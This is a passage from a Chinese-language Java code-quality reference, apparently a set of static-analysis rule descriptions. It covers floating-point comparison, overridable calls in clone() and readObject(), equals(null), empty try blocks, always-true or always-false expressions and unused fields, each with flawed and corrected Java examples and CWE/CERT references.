<h5 id="RECOMMENDATIONS-64"><a href="#RECOMMENDATIONS-64" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在比较浮点值时，应使用如 java.lang.Double.compare() 等比较函数。同样地，由于确保精度至关重要，为了避免丢失精度，最好还是使用 java.math.BigDecimal。</p>
<p>示例 2：以下示例通过使用 java.math.BigDecimal.compareTo 修复了示例 1 的问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">int initialNum = 1;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">BigDecimal result = new BigDecimal(Double.valueOf(initialNum/10000.0).toString());</span><br><span class="line"></span><br><span class="line">if (result.compareTo(new BigDecimal(&quot;0.0001&quot;)) == 0)&#123;</span><br><span class="line"></span><br><span class="line">  //do something</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>以上情况使用了 BigDecimal.compareTo()，与 BigDecimal.equals() 不同的是，它将两个值视为相同，即使值的小数位数并不相同也是如此。</p>
<h5 id="REFERENCES-61"><a href="#REFERENCES-61" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] NUM11-J. Do not compare or inspect the string representation of floating-point values CERT</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<h4 id="Code-Correctness-clone-Invokes-Overridable-Function"><a href="#Code-Correctness-clone-Invokes-Overridable-Function" class="headerlink" title="Code Correctness: clone() Invokes Overridable Function"></a>Code Correctness: clone() Invokes Overridable Function</h4><h5 id="ABSTRACT-63"><a href="#ABSTRACT-63" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该类中的 clone() 方法调用了可覆盖的函数。</p>
<h5 id="EXPLANATION-64"><a href="#EXPLANATION-64" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当 clone() 函数调用了可覆盖的函数后，会导致克隆初始化仅部分完成，或者破坏该克隆。</p>
<p>示例 1：以下 clone() 函数调用了可覆盖的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">class User implements Cloneable &#123;</span><br><span class="line"></span><br><span class="line">  private String username;</span><br><span class="line"></span><br><span class="line">  private boolean valid;</span><br><span class="line"></span><br><span class="line">  public Object clone() throws CloneNotSupportedException &#123;</span><br><span class="line"></span><br><span class="line">    final User clone = (User) super.clone();</span><br><span class="line"></span><br><span class="line">    clone.doSomething();</span><br><span class="line"></span><br><span class="line">    return clone;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void doSomething()&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于函数 doSomething() 和其封装类并非 final，这意味着该函数是可覆盖的，这将导致其克隆对象 clone 呈部分初始化状态，如果没有通过意外方式变通逻辑，则会导致错误。</p>
<h5 id="RECOMMENDATIONS-65"><a href="#RECOMMENDATIONS-65" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>克隆对象的函数不应调用可覆盖的函数，无论是通过将函数指定为 final，还是将类指定为 final 的方式。或者，如果此代码仅在 clone() 函数中需要，则可使用访问说明符 private，或直接将逻辑放入 clone() 方法中。</p>
<p>示例 2：以下示例可防止对 doSomething() 方法进行覆盖。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">class User implements Cloneable &#123;</span><br><span class="line"></span><br><span class="line">  private String username;</span><br><span class="line"></span><br><span class="line">  private boolean valid;</span><br><span class="line"></span><br><span class="line">  public Object clone() throws CloneNotSupportedException &#123;</span><br><span class="line"></span><br><span class="line">    final User clone = (User) super.clone();</span><br><span class="line"></span><br><span class="line">    clone.doSomething();</span><br><span class="line"></span><br><span class="line">    return clone;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public final void doSomething()&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在以上代码中，已将 doSomething 设置为 final，以便其不会由子类所覆盖。</p>
<h5 id="REFERENCES-62"><a href="#REFERENCES-62" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] MET06-J. Do not invoke overridable methods in clone() CERT</p>
<p>[2] EXTEND-5: Limit the extensibility of classes and methods Oracle</p>
<h4 id="Code-Correctness-null-Argument-to-equals"><a href="#Code-Correctness-null-Argument-to-equals" class="headerlink" title="Code Correctness: null Argument to equals()"></a>Code Correctness: null Argument to equals()</h4><h5 id="ABSTRACT-64"><a href="#ABSTRACT-64" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>表达式 obj.equals(null) 将总是 false。</p>
<h5 id="EXPLANATION-65"><a href="#EXPLANATION-65" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>程序会使用 equals() 方法将一个对象与 null 作比较。但是这个比较总是会返回 false，因为对象并不是 null。（如果对象为 null，那么程序将抛出 NullPointerException 异常）。</p>
<h5 id="RECOMMENDATIONS-66"><a href="#RECOMMENDATIONS-66" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在这里，程序员可能想要查看对象是否为空。与以下方法相比</p>
<p>obj.equals(null)</p>
<p>他们更倾向于写入</p>
<p>obj == null</p>
<h5 id="REFERENCES-63"><a href="#REFERENCES-63" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] JavaDoc for Object Sun Microsystems</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 398, CWE ID 754</p>
<p>[3] Standards Mapping - SANS Top 25 2010 Risky Resource Management - CWE ID 754</p>
<h4 id="Code-Correctness-readObject-Invokes-Overridable-Function"><a href="#Code-Correctness-readObject-Invokes-Overridable-Function" class="headerlink" title="Code Correctness: readObject() Invokes Overridable Function"></a>Code Correctness: readObject() Invokes Overridable Function</h4><h5 id="ABSTRACT-65"><a href="#ABSTRACT-65" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该类中的 readObject() 方法调用了可覆盖的函数。</p>
<h5 id="EXPLANATION-66"><a href="#EXPLANATION-66" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在反序列化过程中，由于 readObject() 充当构造函数，因此到此函数终止时，对象初始化才会完成。因此，如果 Serializable 类的 readObject() 函数调用了可覆盖的函数，则在对象尚未完成初始化之前，可能会提供对象状态的覆盖方法访问权限。</p>
<p>示例 1：以下 readObject() 函数调用了可覆盖的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">private void readObject(final ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">  checkStream(ois);</span><br><span class="line"></span><br><span class="line">  ois.defaultReadObject();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public void checkStream(ObjectInputStream stream)&#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果函数 checkStream() 和其封装类并非 final 和公共字段，则意味着该函数是可覆盖的，这意味着攻击者可以覆盖 checkStream() 函数，以便在反序列化过程中访问对象。</p>
<h5 id="RECOMMENDATIONS-67"><a href="#RECOMMENDATIONS-67" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在反序列化过程中，readObject 不应调用可覆盖的函数，无论是通过将其指定为 final 还是将该类指定为 final 的方式。或者，如果此代码仅在 readObject() 函数中需要，则可使用访问说明符 private，或直接将逻辑放入 readObject() 方法中。</p>
<p>示例 2：以下示例可防止对 checkStream() 方法进行覆盖。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">private void readObject(final ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">  checkStream(ois);</span><br><span class="line"></span><br><span class="line">  ois.defaultReadObject();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public final void checkStream(ObjectInputStream stream)&#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在以上代码中，已将 checkStream 设置为 final，以便其不会由子类所覆盖。</p>
<h5 id="REFERENCES-64"><a href="#REFERENCES-64" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] SER09-J. Do not invoke overridable methods from the readObject() method CERT</p>
<p>[2] EXTEND-5: Limit the extensibility of classes and methods Oracle</p>
<p>[3] SERIAL-3: View deserialization the same as object construction Oracle</p>
<h4 id="Dead-Code-Empty-Try-Block"><a href="#Dead-Code-Empty-Try-Block" class="headerlink" title="Dead Code: Empty Try Block"></a>Dead Code: Empty Try Block</h4><h5 id="ABSTRACT-66"><a href="#ABSTRACT-66" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>空 try 块是 dead code 或者表示存在调试代码。</p>
<h5 id="EXPLANATION-67"><a href="#EXPLANATION-67" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>空 try 块没有任何用处。事实上，当编译成字节代码时，优化操作会去除空 try 块，并且不会将其包含在完成的程序中。空 try 块可能表示被删除或注释掉的代码。 例 1：下列代码包含空 try 块。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line"></span><br><span class="line">//rs = stmt.executeQuery(query);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">catch(SQLException e) &#123;</span><br><span class="line"></span><br><span class="line">log(e);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Dead code 对 code quality 有负面影响，会使代码更难于读取、理解和维护。</p>
<h5 id="RECOMMENDATIONS-68"><a href="#RECOMMENDATIONS-68" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果 try 块没有用处，请将其删除。否则，请确定其缺少哪些应用程序逻辑并使用适当的代码完成该 try 块。</p>
<p>例 2：下列代码包含例 1 中省略的缺失代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line"></span><br><span class="line">rs = stmt.executeQuery(query);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">catch(SQLException e) &#123;</span><br><span class="line"></span><br><span class="line">log(e);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-65"><a href="#REFERENCES-65" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems, Inc. Java Sun Tutorial</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 561</p>
<p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3050 CAT II</p>
<p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3050 CAT II</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3050 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3050 CAT II</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3050 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3050 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3050 CAT II</p>
<h4 id="Dead-Code-Expression-is-Always-false"><a href="#Dead-Code-Expression-is-Always-false" class="headerlink" title="Dead Code: Expression is Always false"></a>Dead Code: Expression is Always false</h4><h5 id="ABSTRACT-67"><a href="#ABSTRACT-67" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>此表达式（或部分表达式）的计算结果始终为 false。</p>
<h5 id="EXPLANATION-68"><a href="#EXPLANATION-68" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>此表达式（或部分表达式）的计算结果始终为 false；程序可以按一种更为简单的方式重写。而其附近代码的出现可能是出于调试目的，或者可能没有与程序中的其他代码一同进行维护。该表达式还可能为我们指出方法中的错误所在。</p>
<p>例 1：以下方法将变量 secondCall 初始化为 false 后，将不会再对该变量进行设置。（变量 firstCall 被错误地使用了两次。）其结果是，表达式 firstCall &amp;&amp; secondCall 的计算结果始终为 false，所以永远不会调用 setUpDualCall()。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public void setUpCalls() &#123;</span><br><span class="line"></span><br><span class="line">  boolean firstCall = false;</span><br><span class="line"></span><br><span class="line">  boolean secondCall = false;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  if (fCall &gt; 0) &#123;</span><br><span class="line"></span><br><span class="line">    setUpFCall();</span><br><span class="line"></span><br><span class="line">    firstCall = true;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (sCall &gt; 0) &#123;</span><br><span class="line"></span><br><span class="line">    setUpSCall();</span><br><span class="line"></span><br><span class="line">    firstCall = true;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  if (firstCall &amp;&amp; secondCall) &#123;</span><br><span class="line"></span><br><span class="line">    setUpDualCall();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 2：以下方法不会再将变量 firstCall 设为 true。（在首个条件语句后，变量 firstCall 被错误地设为 false。）其结果是，表达式 firstCall &amp;&amp; secondCall 的第一部分的计算结果始终为 false。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public void setUpCalls() &#123;</span><br><span class="line"></span><br><span class="line">  boolean firstCall = false;</span><br><span class="line"></span><br><span class="line">  boolean secondCall = false;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  if (fCall &gt; 0) &#123;</span><br><span class="line"></span><br><span class="line">    setUpFCall();</span><br><span class="line"></span><br><span class="line">    firstCall = false;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (sCall &gt; 0) &#123;</span><br><span class="line"></span><br><span class="line">    setUpSCall();</span><br><span class="line"></span><br><span class="line">    secondCall = true;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  if (firstCall || secondCall) &#123;</span><br><span class="line"></span><br><span class="line">    setUpForCall();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-69"><a href="#RECOMMENDATIONS-69" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>总之，您应该去修改或是删除未使用的代码。它不仅不能实现任何程序功能，还会带来额外的麻烦和维修负担。</p>
<h5 id="REFERENCES-66"><a href="#REFERENCES-66" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 570</p>
<p>[2] Standards Mapping - MISRA C 2012 Rule 14.3</p>
<p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3050 CAT II</p>
<p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3050 CAT II</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3050 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3050 CAT II</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3050 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3050 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3050 CAT II</p>
<h4 id="Dead-Code-Expression-is-Always-true"><a href="#Dead-Code-Expression-is-Always-true" class="headerlink" title="Dead Code: Expression is Always true"></a>Dead Code: Expression is Always true</h4><h5 id="ABSTRACT-68"><a href="#ABSTRACT-68" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>此表达式（或部分表达式）的计算结果始终为 true。</p>
<h5 id="EXPLANATION-69"><a href="#EXPLANATION-69" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>此表达式（或部分表达式）的计算结果始终为 true；程序可以按一种更为简单的方式重写。而其附近代码的出现可能是出于调试目的，或者可能没有与程序中的其他代码一同进行维护。该表达式还可能为我们指出方法中的错误所在。</p>
<p>例 1：以下方法将变量 secondCall 初始化为 true 后，将不会再对该变量进行设置。（变量 firstCall 被错误地使用了两次。）其结果是，表达式 firstCall || secondCall 的计算结果始终为 true，所以始终会调用 setUpForCall()。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public void setUpCalls() &#123;</span><br><span class="line"></span><br><span class="line">  boolean firstCall = true;</span><br><span class="line"></span><br><span class="line">  boolean secondCall = true;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  if (fCall &lt; 0) &#123;</span><br><span class="line"></span><br><span class="line">    cancelFCall();</span><br><span class="line"></span><br><span class="line">    firstCall = false;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (sCall &lt; 0) &#123;</span><br><span class="line"></span><br><span class="line">    cancelSCall();</span><br><span class="line"></span><br><span class="line">    firstCall = false;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  if (firstCall || secondCall) &#123;</span><br><span class="line"></span><br><span class="line">    setUpForCall();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 2：以下方法尝试检查变量 firstCall 和 secondCall。（变量 firstCall 被错误地设为 true，而不是对其进行检查。）其结果是，表达式 firstCall = true &amp;&amp; secondCall == true 的第一部分的计算结果始终为 true。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public void setUpCalls() &#123;</span><br><span class="line"></span><br><span class="line">  boolean firstCall = false;</span><br><span class="line"></span><br><span class="line">  boolean secondCall = false;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  if (fCall &gt; 0) &#123;</span><br><span class="line"></span><br><span class="line">    setUpFCall();</span><br><span class="line"></span><br><span class="line">    firstCall = true;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (sCall &gt; 0) &#123;</span><br><span class="line"></span><br><span class="line">    setUpSCall();</span><br><span class="line"></span><br><span class="line">    secondCall = true;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  if (firstCall = true &amp;&amp; secondCall == true) &#123;</span><br><span class="line"></span><br><span class="line">    setUpDualCall();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-70"><a href="#RECOMMENDATIONS-70" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>总之，您应该去修改或是删除未使用的代码。它不仅不能实现任何程序功能，还会带来额外的麻烦和维修负担。</p>
<h5 id="REFERENCES-67"><a href="#REFERENCES-67" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 571</p>
<p>[2] Standards Mapping - MISRA C 2012 Rule 14.3</p>
<p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3050 CAT II</p>
<p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3050 CAT II</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3050 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3050 CAT II</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3050 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3050 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3050 CAT II</p>
<h4 id="Dead-Code-Unused-Field"><a href="#Dead-Code-Unused-Field" class="headerlink" title="Dead Code: Unused Field"></a>Dead Code: Unused Field</h4><h5 id="ABSTRACT-69"><a href="#ABSTRACT-69" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>从不使用这个字段。</p>
<h5 id="EXPLANATION-70"><a href="#EXPLANATION-70" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>这个字段从未被访问过，或者仅通过 dead code 进行调用。Dead code 是指从未以公共方法直接或间接执行的代码。虽然某一字段可能已经过时，不太被人们使用了，但 unused field 仍有可能指出 bug 的所在。</p>
<p>例 1： 在以下的类中，并没有使用到 glue 字段。但是该类的作者无意间对该字段名进行了引用，将其转变成了字符串常量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public class Dead &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  String glue;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  public String getGlue() &#123;</span><br><span class="line"></span><br><span class="line">    return &quot;glue&quot;;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 2： 在下面这个类中使用了 glue 字段，但是并不会调用使用这个字段的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public class Dead &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  String glue;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  private String getGlue() &#123;</span><br><span class="line"></span><br><span class="line">    return glue;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-71"><a href="#RECOMMENDATIONS-71" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>总之，您应该去修改或是删除 dead code。要修复 dead code，请通过公共方法直接或间接执行此 dead code。Dead code 不仅不能实现任何程序功能，还会带来额外的麻烦和维护负担。</p>
<h5 id="REFERENCES-68"><a href="#REFERENCES-68" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 561</p>
<p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3050 CAT II</p>
